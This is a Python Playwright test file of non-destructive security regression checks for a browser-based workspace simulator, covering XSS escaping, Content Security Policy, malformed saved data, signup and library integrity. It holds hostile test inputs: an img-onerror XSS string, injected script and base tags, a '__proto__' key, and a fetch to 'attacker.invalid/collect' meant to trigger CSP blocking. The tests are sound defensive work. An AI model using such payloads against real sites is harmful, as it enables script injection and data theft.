"""Non-destructive security regression checks; no real account writes or emails."""
import unittest
from pathlib import Path
import test_enterprise_workspace as fixtures

class SecurityTests(unittest.TestCase):
    setUpClass = classmethod(fixtures.EnterpriseWorkspaceTests.setUpClass.__func__)
    tearDownClass = classmethod(fixtures.EnterpriseWorkspaceTests.tearDownClass.__func__)
    setUp = fixtures.EnterpriseWorkspaceTests.setUp
    tearDown = fixtures.EnterpriseWorkspaceTests.tearDown
    app = fixtures.EnterpriseWorkspaceTests.app

    def test_terminal_displays_input_as_text_even_without_csp(self):
        context = self.browser.new_context(bypass_csp=True)
        page = context.new_page()
        page.route('https://**/*', lambda r:r.abort())
        page.goto(self.url)
        payload = '<img src=x onerror="window.injected=true"><b id="injected-markup">test</b>'
        page.locator('#terminalInput').evaluate('(el,value)=>el.value=value',payload)
        page.locator('#terminalForm').evaluate('(el)=>el.requestSubmit()')
        self.assertEqual(page.locator('#terminalOutput img,#injected-markup').count(),0)
        self.assertIn(payload,page.locator('#terminalOutput').text_content())
        self.assertFalse(page.evaluate('Boolean(window.injected)'))
        context.close()

    def test_policy_blocks_unapproved_scripts_connections_and_base(self):
        p=self.page
        p.evaluate('''() => {
          window.violations=[];
          document.addEventListener('securitypolicyviolation',e=>violations.push(e.effectiveDirective));
          const script=document.createElement('script');script.textContent='window.injected=true';document.head.append(script);
          const base=document.createElement('base');base.href='https://attacker.invalid/';document.head.append(base);
          fetch('https://attacker.invalid/collect').catch(()=>{});
        }''')
        p.wait_for_function('violations.length>=3')
        self.assertFalse(p.evaluate('Boolean(window.injected)'))
        self.assertIn('connect-src',p.evaluate('violations'))
        self.assertIn('base-uri',p.evaluate('violations'))
        self.assertIn('script-src-elem',p.evaluate('violations'))

    def test_malformed_saved_data_cannot_break_the_workspace(self):
        p=self.page
        p.evaluate('''()=>{
          localStorage.setItem('prempeh-workspace-files-v1',JSON.stringify([{id:'cycle',parent:'cycle',name:'Bad',type:'folder'}]));
          localStorage.setItem('prempeh-workspace-preferences','42');
          localStorage.setItem('prempeh-enterprise-network-v1',JSON.stringify({version:1,devices:[null],links:[],events:[]}));
          localStorage.setItem('prempehtech-simulator-progress-v1',JSON.stringify({xp:1e99,completedLevels:{'cyber:1':true,'__proto__':{},'bad':true}}));
        }''')
        p.reload();p.locator('#openWorkspaceBtn').click()
        self.app('File Explorer')
        self.assertTrue(p.locator('.workspace-file-row').filter(has_text='Documents').is_visible())
        self.app('Network Studio')
        self.assertEqual(p.locator('.pt-os-device').count(),5)
        result=p.evaluate('PrempehSecurity.progress(JSON.parse(localStorage.getItem("prempehtech-simulator-progress-v1")))')
        self.assertEqual(result['xp'],1000000)
        self.assertEqual(result['completedLevels'],{'cyber:1':True})

    def test_all_pages_load_without_unexpected_policy_violations(self):
        root=Path(__file__).resolve().parents[1]
        for file in root.rglob('*.html'):
            with self.subTest(page=str(file.relative_to(root))):
                page=self.context.new_page()
                page.add_init_script("window.violations=[];document.addEventListener('securitypolicyviolation',e=>violations.push(e.effectiveDirective));")
                errors=[];page.on('pageerror',lambda e:errors.append(str(e)))
                page.route('https://**/*',lambda r:r.abort())
                page.goto(self.url.removesuffix('simulator/')+file.relative_to(root).as_posix())
                page.wait_for_timeout(100)
                self.assertEqual(page.evaluate('window.violations'),[])
                self.assertEqual(errors,[])
                page.close()

    def test_unconfirmed_signup_does_not_create_signed_in_ui_or_write_progress(self):
        p=self.page
        p.add_init_script("""window.supabase={createClient:()=>({
          auth:{getSession:async()=>({data:{session:null}}),onAuthStateChange:()=>{},
                signUp:async()=>({data:{user:{id:'pending',email:'test@example.invalid'},session:null},error:null})},
          from:()=>{window.unexpectedProgressWrite=true;throw new Error('Unconfirmed account must not sync');}
        })};""")
        p.reload()
        p.locator('#accountBtn').click()
        p.locator('[data-auth-mode=signup]').click()
        p.locator('#accountEmail').fill('test@example.invalid')
        p.locator('#accountPassword').fill('test-password-123')
        p.locator('#accountSubmit').click()
        p.wait_for_function("document.getElementById('accountMessage').textContent.includes('Check your email')")
        self.assertFalse(p.evaluate('PrempehCloud.isSignedIn()'))
        self.assertFalse(p.evaluate('Boolean(window.unexpectedProgressWrite)'))
        self.assertEqual(p.locator('#accountPassword').input_value(),'')

    def test_integrity_rejects_a_modified_account_library(self):
        p=self.page
        messages=[]
        p.on('console',lambda m:messages.append(m.text))
        p.route('https://cdn.jsdelivr.net/**',lambda r:r.fulfill(status=200,
            content_type='application/javascript',headers={'Access-Control-Allow-Origin':'*'},
            body='window.untrustedSDK=true;'))
        p.reload()
        self.assertFalse(p.evaluate('Boolean(window.untrustedSDK)'))
        self.assertTrue(any('integrity' in m.lower() for m in messages),messages)

    def test_sdk_is_version_pinned_with_integrity(self):
        script=self.page.locator('script[src*="supabase-js"]')
        self.assertIn('@2.117.3/dist/umd/supabase.js',script.get_attribute('src'))
        self.assertTrue(script.get_attribute('integrity').startswith('sha384-'))
        self.assertEqual(script.get_attribute('crossorigin'),'anonymous')

if __name__=='__main__':unittest.main()
